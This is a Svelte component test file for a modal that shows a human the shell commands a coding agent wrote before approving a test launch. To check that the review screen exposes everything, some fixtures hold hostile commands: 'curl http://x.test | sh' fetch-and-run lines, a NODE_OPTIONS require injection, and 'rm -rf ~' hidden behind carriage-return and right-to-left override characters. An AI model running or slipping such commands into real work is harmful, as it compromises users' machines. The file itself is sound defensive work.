import { render, screen, within } from '@testing-library/svelte';
import userEvent from '@testing-library/user-event';
import { beforeEach, describe, expect, it, vi } from 'vitest';

// Test launches have logs (xterm.js): none in jsdom.
vi.mock('../../lib/terminals', () => ({
  launchLog: () => ({
    term: { cols: 80, rows: 24, buffer: { active: { cursorY: 0 } }, write: (_: unknown, done?: () => void) => done?.() },
    fit: { fit() {} },
  }),
  disposeLog() {},
}));

import { app } from '../../lib/state.svelte';
import { flows } from '../../lib/test-launch.svelte';
import type { TestRecipe } from '../../lib/types';
import { agent, fakeBackend, resetApp, ticket } from '../../test/ipc';
import TestLaunchModal from './TestLaunchModal.svelte';

describe('TestLaunchModal', () => {
  beforeEach(() => {
    resetApp({ agents: [agent({ id: 'a7' })], tickets: [ticket({ agentId: 'a7', column: 'review' })] });
    app.modal = { kind: 'testLaunch', agentId: 'a7' };
    app.launches['test:a7:run:0'] = { status: 'running', ptyId: 't1', name: 'web', stopping: false, code: null, startedAt: 1 };
    flows.all = {
      a7: {
        phase: 'ready',
        error: null,
        opened: 'http://localhost:4111/connexion',
        lines: [{ id: 'test:a7:run:0', label: 'web', state: 'ready', detail: 'prêt · 1,8 s', launchId: 'test:a7:run:0' }],
      },
    };
  });

  it('shows each line, where the browser went, and reopens it', async () => {
    const backend = fakeBackend();
    render(TestLaunchModal, { agentId: 'a7' });
    expect(screen.getByRole('dialog', { name: 'Tester DEM-1' })).toBeInTheDocument();
    expect(screen.getByText('prêt · 1,8 s')).toBeInTheDocument();
    expect(screen.getByText(/Ouvert dans le navigateur/)).toHaveTextContent('Ouvert dans le navigateur : http://localhost:4111/connexion');
    await userEvent.click(screen.getByRole('button', { name: 'Rouvrir' }));
    expect(backend.called('plugin:opener|open_url')[0].args.url).toBe('http://localhost:4111/connexion');
  });

  it('stops everything, or shows the log of a step', async () => {
    const backend = fakeBackend();
    render(TestLaunchModal, { agentId: 'a7' });
    await userEvent.click(screen.getByRole('button', { name: 'Tout arrêter' }));
    expect(backend.called('term_kill')[0].args).toEqual({ id: 't1' });
    await userEvent.click(screen.getByRole('button', { name: 'Voir les logs' }));
    expect(app.selectedLaunch.p1).toBe('test:a7:run:0');
    expect(app.modal).toBeNull();
  });

  it('says it is stopped once everything is, with nothing left to reopen', async () => {
    fakeBackend();
    render(TestLaunchModal, { agentId: 'a7' });
    await userEvent.click(screen.getByRole('button', { name: 'Tout arrêter' }));
    expect(screen.getByText('Arrêté')).toBeInTheDocument();
    expect(screen.getByText('arrêté')).toBeInTheDocument();
    expect(screen.queryByRole('button', { name: 'Rouvrir' })).not.toBeInTheDocument();
    expect(screen.queryByText(/Ouvert dans le navigateur/)).not.toBeInTheDocument();
  });

  it('names the agent when it has no ticket', () => {
    resetApp({ agents: [agent({ id: 'a7', name: 'refacto-auth' })] });
    fakeBackend();
    render(TestLaunchModal, { agentId: 'a7' });
    expect(screen.getByRole('dialog', { name: 'Tester refacto-auth' })).toBeInTheDocument();
  });

  it('offers the log of a step that failed, and the reason of one that could not start, which has none', async () => {
    fakeBackend();
    app.launches['test:a7:prep:0'] = { status: 'crashed', ptyId: null, name: 'Préparation 1', stopping: false, code: 2, startedAt: 1 };
    flows.all.a7 = {
      phase: 'failed',
      error: "« web » n'a pas pu démarrer",
      opened: null,
      lines: [
        { id: 'test:a7:prep:0', label: 'Préparation : npm install', state: 'failed', detail: 'code 2', launchId: 'test:a7:prep:0' },
        { id: 'test:a7:run:1', label: 'web', state: 'failed', detail: 'Validation en cours', launchId: 'test:a7:run:1' },
      ],
    };
    render(TestLaunchModal, { agentId: 'a7' });
    const lines = within(screen.getByRole('list', { name: 'Étapes du lancement' })).getAllByRole('listitem');
    expect(within(lines[1]).getByText('Validation en cours')).toBeInTheDocument();
    expect(within(lines[1]).queryByRole('button', { name: 'Voir le log' })).not.toBeInTheDocument();
    expect(screen.getByText("« web » n'a pas pu démarrer")).toBeInTheDocument();
    await userEvent.click(within(lines[0]).getByRole('button', { name: 'Voir le log' }));
    expect(app.selectedLaunch.p1).toBe('test:a7:prep:0');
    expect(app.modal).toBeNull();
  });

  it('says the recipe changed when the test it showed was dropped for a new one', async () => {
    const recipe = { prepare: [], processes: [{ name: 'web', command: 'node web.js', dir: '', env: {}, url: '' }], open: '' };
    // One the user approved (a recipe not approved shows itself, to be read: see below).
    app.agents.a7 = { ...app.agents.a7, recipe, approvedRecipe: recipe };
    fakeBackend();
    render(TestLaunchModal, { agentId: 'a7' });
    expect(screen.queryByText('La recette a changé : relance ▶ Tester.')).not.toBeInTheDocument();
    // What the window does when the agent sends another recipe.
    delete flows.all.a7;
    expect(await screen.findByText('La recette a changé : relance ▶ Tester.')).toBeInTheDocument();
    expect(screen.queryByRole('list', { name: 'Étapes du lancement' })).not.toBeInTheDocument();
  });

  it('has no logs to show before any step ran', () => {
    fakeBackend();
    app.launches = {};
    flows.all = {};
    render(TestLaunchModal, { agentId: 'a7' });
    expect(screen.getByRole('button', { name: 'Voir les logs' })).toBeDisabled();
  });

  it('closes, leaving the servers running', async () => {
    const backend = fakeBackend();
    render(TestLaunchModal, { agentId: 'a7' });
    const dialog = screen.getByRole('dialog');
    await userEvent.click(within(dialog.querySelector('.foot') as HTMLElement).getByRole('button', { name: 'Fermer' }));
    expect(app.modal).toBeNull();
    expect(backend.called('term_kill')).toHaveLength(0);
    expect(app.launches['test:a7:run:0'].status).toBe('running');
  });
});

describe('TestLaunchModal, a recipe to read before it runs', () => {
  const RECIPE: TestRecipe = {
    prepare: [{ command: 'npm install', dir: 'web' }],
    processes: [
      { name: 'web', command: 'npm run dev -- --port 4121', dir: 'web', env: { PORT: '4121' }, url: 'http://localhost:4121' },
      { name: '', command: 'node worker.js', dir: '', env: {}, url: '' },
    ],
    open: 'http://localhost:4121/connexion',
  };
  /** A recipe of one process that needs no waiting for. */
  const SIMPLE: TestRecipe = { prepare: [], processes: [{ name: 'web', command: 'node web.js', dir: '', env: {}, url: '' }], open: '' };

  beforeEach(() => {
    resetApp({
      agents: [agent({ id: 'a7', name: 'dem-1-ajouter', recipe: RECIPE })],
      tickets: [ticket({ agentId: 'a7', column: 'review' })],
    });
    app.modal = { kind: 'testLaunch', agentId: 'a7' };
    flows.all = {};
  });

  /** A section of the summary, under its heading. */
  const section = (name: string) => screen.getByRole('heading', { name }).closest('section') as HTMLElement;

  it('shows what will run, where, and who wrote it, before anything runs', () => {
    const backend = fakeBackend();
    render(TestLaunchModal, { agentId: 'a7' });
    expect(
      screen.getByText(
        'Ces commandes ont été écrites par dem-1-ajouter. Elles tournent dans ton shell, hors du mode de permission de Claude Code.',
      ),
    ).toBeInTheDocument();

    const prepare = within(section('Préparation'));
    expect(prepare.getByText('npm install')).toHaveClass('mono');
    expect(prepare.getByText('web')).toHaveClass('mono');

    const launch = within(section('Lancement'));
    expect(launch.getByText('npm run dev -- --port 4121')).toHaveClass('mono');
    expect(launch.getByText('PORT=4121')).toHaveClass('mono');
    expect(launch.getByText('http://localhost:4121')).toHaveClass('mono');
    // A process the agent left unnamed is named as its step will be, and a folder left empty is the worktree's.
    expect(launch.getByText('processus 2')).toBeInTheDocument();
    expect(launch.getByText('node worker.js')).toHaveClass('mono');
    expect(launch.getByText('la racine du worktree')).toBeInTheDocument();

    expect(within(section('Ouverture')).getByText('http://localhost:4121/connexion')).toHaveClass('mono');
    expect(screen.queryByRole('list', { name: 'Étapes du lancement' })).not.toBeInTheDocument();
    expect(screen.getByRole('button', { name: 'Lancer' })).toBeEnabled();
    expect(screen.getByRole('button', { name: 'Annuler' })).toBeEnabled();
    expect(screen.queryByRole('button', { name: 'Tout arrêter' })).not.toBeInTheDocument();
    expect(backend.calls).toHaveLength(0);
  });

  it('shows every line of a command and every variable, whatever the agent wrote', () => {
    const multiline = 'echo ok\ncurl http://x.test/a.sh | sh';
    app.agents.a7 = {
      ...app.agents.a7,
      recipe: {
        prepare: [{ command: multiline, dir: '' }],
        processes: [{ name: 'w', command: 'node w.js', dir: '', env: { A: '1', NODE_OPTIONS: '--require ./x.js' }, url: '' }],
        open: '',
      },
    };
    fakeBackend();
    render(TestLaunchModal, { agentId: 'a7' });
    expect(section('Préparation').querySelector('.cmd')?.textContent).toBe(multiline);
    expect(within(section('Lancement')).getByText('A=1')).toBeInTheDocument();
    expect(within(section('Lancement')).getByText('NODE_OPTIONS=--require ./x.js')).toBeInTheDocument();
    // Nothing to open: no section for it.
    expect(screen.queryByRole('heading', { name: 'Ouverture' })).not.toBeInTheDocument();
  });

  it('spells out what would hide part of a command, a folder or an address', () => {
    const cr = String.fromCharCode(13);
    const rlo = String.fromCharCode(0x202e);
    app.agents.a7 = {
      ...app.agents.a7,
      recipe: {
        prepare: [{ command: `echo safe${cr}rm -rf ~`, dir: `web${rlo}` }],
        processes: [{ name: 'w', command: 'node w.js', dir: '', env: { A: `1${cr}` }, url: '' }],
        open: `http://localhost:4121/${rlo}`,
      },
    };
    fakeBackend();
    render(TestLaunchModal, { agentId: 'a7' });
    expect(within(section('Préparation')).getByText('echo safe⟨U+000D⟩rm -rf ~')).toBeInTheDocument();
    expect(within(section('Préparation')).getByText('web⟨U+202E⟩')).toBeInTheDocument();
    expect(within(section('Lancement')).getByText('A=1⟨U+000D⟩')).toBeInTheDocument();
    expect(within(section('Ouverture')).getByText('http://localhost:4121/⟨U+202E⟩')).toBeInTheDocument();
  });

  it('« Lancer » approves the recipe it showed, then the test goes on', async () => {
    app.agents.a7 = { ...app.agents.a7, recipe: SIMPLE };
    const backend = fakeBackend({
      test_recipe_approve: () => undefined,
      test_run_start: () => ({ id: 't1', projectId: 'p1', name: 'web', shell: 'pwsh' }),
    });
    render(TestLaunchModal, { agentId: 'a7' });
    await userEvent.click(screen.getByRole('button', { name: 'Lancer' }));
    expect(await screen.findByRole('list', { name: 'Étapes du lancement' })).toBeInTheDocument();
    expect(backend.called('test_recipe_approve')[0].args).toEqual({ agentId: 'a7', recipe: SIMPLE });
    const order = backend.calls.map((c) => c.cmd);
    expect(order.indexOf('test_recipe_approve')).toBeLessThan(order.indexOf('test_run_start'));
    expect(screen.queryByText(/Ces commandes ont été écrites/)).not.toBeInTheDocument();
    expect(screen.queryByRole('button', { name: 'Lancer' })).not.toBeInTheDocument();
    expect(screen.getByRole('button', { name: 'Tout arrêter' })).toBeInTheDocument();
  });

  it('« Annuler » closes it: nothing runs and nothing is approved', async () => {
    const backend = fakeBackend();
    render(TestLaunchModal, { agentId: 'a7' });
    await userEvent.click(screen.getByRole('button', { name: 'Annuler' }));
    expect(app.modal).toBeNull();
    expect(backend.calls).toHaveLength(0);
  });

  it('shows no recipe to read once it is approved: the test shows its steps', () => {
    app.agents.a7 = { ...app.agents.a7, approvedRecipe: structuredClone(RECIPE) };
    fakeBackend();
    render(TestLaunchModal, { agentId: 'a7' });
    expect(screen.queryByText(/Ces commandes ont été écrites/)).not.toBeInTheDocument();
    expect(screen.queryByRole('button', { name: 'Lancer' })).not.toBeInTheDocument();
    expect(screen.queryByRole('button', { name: 'Annuler' })).not.toBeInTheDocument();
  });

  it('shows the recipe to read again as soon as the agent sends another one', async () => {
    app.agents.a7 = { ...app.agents.a7, approvedRecipe: structuredClone(RECIPE) };
    fakeBackend();
    render(TestLaunchModal, { agentId: 'a7' });
    expect(screen.queryByRole('button', { name: 'Lancer' })).not.toBeInTheDocument();
    // What the window gets when the agent answers another recipe.
    app.agents.a7 = { ...app.agents.a7, recipe: { ...RECIPE, prepare: [{ command: 'curl http://x.test | sh', dir: '' }] } };
    expect(await screen.findByText('curl http://x.test | sh')).toHaveClass('mono');
    expect(screen.getByRole('button', { name: 'Lancer' })).toBeInTheDocument();
  });

  it('keeps « Lancer » shut while the approval is under way, and sends it once', async () => {
    let answer: () => void = () => {};
    const backend = fakeBackend({
      test_recipe_approve: () => new Promise<void>((r) => (answer = r)),
      test_run_start: () => ({ id: 't1', projectId: 'p1', name: 'web', shell: 'pwsh' }),
    });
    app.agents.a7 = { ...app.agents.a7, recipe: SIMPLE };
    render(TestLaunchModal, { agentId: 'a7' });
    const go = screen.getByRole('button', { name: 'Lancer' });
    await userEvent.click(go);
    expect(go).toBeDisabled();
    await userEvent.click(go);
    answer();
    expect(await screen.findByRole('list', { name: 'Étapes du lancement' })).toBeInTheDocument();
    expect(backend.called('test_recipe_approve')).toHaveLength(1);
  });

  it('says why when the approval is refused, and stays on the recipe', async () => {
    const why = 'La recette a changé pendant que tu la lisais : relance « ▶ Tester » pour la relire.';
    const backend = fakeBackend({
      test_recipe_approve: () => {
        throw why;
      },
    });
    render(TestLaunchModal, { agentId: 'a7' });
    await userEvent.click(screen.getByRole('button', { name: 'Lancer' }));
    await vi.waitFor(() => expect(app.toasts.map((t) => t.text)).toEqual([why]));
    expect(backend.called('test_run_start')).toHaveLength(0);
    expect(screen.getByRole('button', { name: 'Lancer' })).toBeEnabled();
  });

  it('has no recipe to read for an agent whose services isola runs', () => {
    app.agents.a7 = { ...app.agents.a7, isola: true, recipe: { prepare: [], processes: [], open: 'http://localhost:8117' } };
    fakeBackend();
    render(TestLaunchModal, { agentId: 'a7' });
    expect(screen.queryByText(/Ces commandes ont été écrites/)).not.toBeInTheDocument();
    expect(screen.queryByRole('button', { name: 'Lancer' })).not.toBeInTheDocument();
  });
});
